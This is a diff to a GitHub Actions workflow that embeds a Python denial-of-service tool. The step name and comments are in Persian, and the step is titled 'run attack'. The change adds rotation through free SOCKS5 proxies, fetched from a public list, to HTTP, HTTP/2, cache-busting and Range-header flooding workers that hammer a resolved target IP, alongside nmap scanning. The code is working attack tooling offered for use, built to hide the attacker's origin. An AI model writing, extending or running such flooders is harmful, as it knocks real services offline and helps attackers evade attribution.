@@ -56,7 +56,7 @@ jobs:
         run: |
           sudo apt-get update
           sudo apt-get install -y nmap
-          pip3 install aiohttp rich "httpx[http2]" websockets scapy python-nmap
+          pip3 install aiohttp rich "httpx[http2]" websockets scapy python-nmap aiohttp_socks
 
       - name: اجرای حمله
         env:
@@ -80,6 +80,7 @@ jobs:
           CACHE_FILE = CACHE_DIR / "targets_cache.json"
           REPORT_FILE = "attack_report.txt"
           CACHE_VALID_HOURS = 24
+          PROXY_LIST_FILE = "proxy_list.txt"
 
           # ===== رویداد توقف سراسری =====
           stop_event = threading.Event()
@@ -217,11 +218,57 @@ jobs:
           ]
           def get_random_path(): return random.choice(RANDOM_PATHS)
 
-          # ===== کارگرهای جدید با پشتیبانی از stop_event =====
+          # ===== 1. ماژول مدیریت پروکسی =====
+          def fetch_free_proxies():
+              """دریافت و پردازش لیست پروکسی‌های رایگان"""
+              try:
+                  console.print("[cyan]⚙️ در حال دریافت لیست پروکسی‌های رایگان...[/cyan]")
+                  # دانلود لیست از مخزن TheSpeedX
+                  url = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt"
+                  resp = requests.get(url, timeout=10)
+                  proxies = []
+                  for line in resp.text.splitlines():
+                      if ":" in line and line.count('.') == 3:
+                          proxies.append(line.strip())
+                  console.print(f"[green]🎯 {len(proxies)} پروکسی دریافت شد.[/green]")
+                  return proxies
+              except:
+                  console.print("[red]❌ خطا در دریافت پروکسی‌ها. بدون پروکسی ادامه می‌دهیم.[/red]")
+                  return []
+
+          def is_proxy_alive(proxy):
+              """بررسی زنده بودن پروکسی"""
+              try:
+                  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                  sock.settimeout(3)
+                  ip = proxy.split(':')[0]
+                  port = int(proxy.split(':')[1])
+                  sock.connect((ip, port))
+                  sock.close()
+                  return True
+              except:
+                  return False
+
+          PROXIES = []
+          def init_proxies():
+              global PROXIES
+              PROXIES = fetch_free_proxies()
+              if PROXIES:
+                  console.print("[green]✅ پروکسی‌ها با موفقیت بارگذاری شدند.[/green]")
+              else:
+                  console.print("[yellow]⚠️ هیچ پروکسی در دسترسی نیست. حمله با IP مستقیم انجام خواهد شد.[/yellow]")
+
+          def get_random_proxy():
+              """انتخاب یک پروکسی تصادفی از لیست"""
+              if PROXIES:
+                  return random.choice(PROXIES)
+              return None
+
+          # ===== 2. کارگرهای جدید با پشتیبانی از پروکسی و stop_event =====
           async def http_worker(url, worker_id):
-              connector = aiohttp.TCPConnector(limit=0, force_close=False)
-              async with aiohttp.ClientSession(connector=connector) as session:
+              async with aiohttp.ClientSession() as session:
                   while not stop_event.is_set():
+                      proxy = get_random_proxy()
                       headers = {
                           "User-Agent": get_random_ua(),
                           "Accept": "*/*",
@@ -230,7 +277,7 @@ jobs:
                           "Connection": "keep-alive",
                       }
                       try:
-                          async with session.get(url.rstrip('/') + get_random_path(), headers=headers, timeout=5) as r:
+                          async with session.get(url.rstrip('/') + get_random_path(), headers=headers, timeout=5, proxy=proxy) as r:
                               increment('sent')
                               if r.status < 500: increment('success')
                               else: increment('failed')
@@ -242,9 +289,10 @@ jobs:
               import httpx
               async with httpx.AsyncClient(http2=True, verify=False, timeout=5.0) as client:
                   while not stop_event.is_set():
+                      proxy = get_random_proxy()
                       headers = {"User-Agent": get_random_ua(), "Accept": "*/*"}
                       try:
-                          r = await client.get(url.rstrip('/') + get_random_path(), headers=headers)
+                          r = await client.get(url.rstrip('/') + get_random_path(), headers=headers, proxy=proxy)
                           increment('sent')
                           if r.status_code < 500: increment('success')
                           else: increment('failed')
@@ -273,9 +321,9 @@ jobs:
                       await asyncio.sleep(1)
 
           async def cache_bypass_worker(url, worker_id):
-              connector = aiohttp.TCPConnector(limit=0, force_close=False)
-              async with aiohttp.ClientSession(connector=connector) as session:
+              async with aiohttp.ClientSession() as session:
                   while not stop_event.is_set():
+                      proxy = get_random_proxy()
                       params = {f"cachebuster_{random.randint(1000,9999)}": random.randint(100000, 999999) for _ in range(random.randint(3,8))}
                       headers = {
                           "User-Agent": get_random_ua(),
@@ -284,7 +332,7 @@ jobs:
                           "Vary": "User-Agent",
                       }
                       try:
-                          async with session.get(url.rstrip('/') + get_random_path(), params=params, headers=headers, timeout=5) as r:
+                          async with session.get(url.rstrip('/') + get_random_path(), params=params, headers=headers, timeout=5, proxy=proxy) as r:
                               increment('sent')
                               if r.status < 500: increment('success')
                               else: increment('failed')
@@ -293,16 +341,16 @@ jobs:
                       await asyncio.sleep(0.001)
 
           async def range_worker(url, worker_id):
-              connector = aiohttp.TCPConnector(limit=0, force_close=False)
-              async with aiohttp.ClientSession(connector=connector) as session:
+              async with aiohttp.ClientSession() as session:
                   while not stop_event.is_set():
+                      proxy = get_random_proxy()
                       headers = {
                           "User-Agent": get_random_ua(),
                           "Range": f"bytes={random.randint(0,1024)}-{random.randint(1025,1048576)}",
                           "Accept-Encoding": "identity",
                       }
                       try:
-                          async with session.get(url.rstrip('/') + get_random_path(), headers=headers, timeout=5) as r:
+                          async with session.get(url.rstrip('/') + get_random_path(), headers=headers, timeout=5, proxy=proxy) as r:
                               increment('sent')
                               if r.status < 500: increment('success')
                               else: increment('failed')
@@ -400,6 +448,9 @@ jobs:
               console.print("[red]❌ نمی‌تونم IP رو پیدا کنم.[/red]")
               sys.exit(1)
           console.print(f"🎯 IP هدف: [bold cyan]{ip}[/bold cyan]")
+
+          # === راه‌اندازی پروکسی‌ها ===
+          init_proxies()
 
           target_ports = None
           cached_ports = get_cached_scan(ip)
